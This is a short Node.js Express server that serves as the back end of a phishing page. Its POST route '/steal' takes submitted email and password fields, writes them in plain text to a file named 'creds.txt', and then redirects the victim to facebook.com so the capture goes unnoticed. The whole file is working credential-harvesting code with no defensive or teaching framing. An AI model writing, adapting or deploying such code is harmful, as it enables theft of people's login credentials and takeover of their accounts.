const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Route to handle form submission
app.post('/steal', (req, res) => {
  const { email, pass } = req.body;
  const logEntry = `Email: ${email}, Password: ${pass}\n`;
  fs.appendFileSync('creds.txt', logEntry);
  res.redirect('https://facebook.com'); // redirect after capture
});

// Start server
app.listen(PORT, () => {
  console.log(`🟢 Server running at http://localhost:${PORT}`);
});
